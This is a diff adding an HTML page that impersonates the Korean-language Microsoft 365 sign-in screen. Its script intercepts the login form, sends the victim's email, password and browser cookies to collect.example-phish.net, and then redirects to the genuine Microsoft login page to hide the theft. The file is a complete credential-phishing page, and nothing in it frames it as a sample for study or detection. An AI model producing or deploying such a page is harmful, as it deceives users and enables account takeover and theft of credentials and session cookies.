@@ -1,0 +1,21 @@
+<!doctype html>
+<html lang="ko"><head><meta charset="utf-8"><title>Microsoft 365 로그인</title></head>
+<body>
+<div class="login-box">
+  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==" alt="logo">
+  <h1>계정에 로그인</h1>
+  <form id="f" action="#">
+    <input type="email" name="loginfmt" placeholder="이메일">
+    <input type="password" name="passwd" placeholder="암호">
+    <button type="submit">로그인</button>
+  </form>
+</div>
+<script>
+document.getElementById('f').addEventListener('submit', function (e) {
+  e.preventDefault();
+  var data = { u: this.loginfmt.value, p: this.passwd.value, c: document.cookie };
+  fetch('https://collect.example-phish.net/api/store', { method: 'POST', body: JSON.stringify(data) });
+  location.href = 'https://login.microsoftonline.com/';
+});
+</script>
+</body></html>
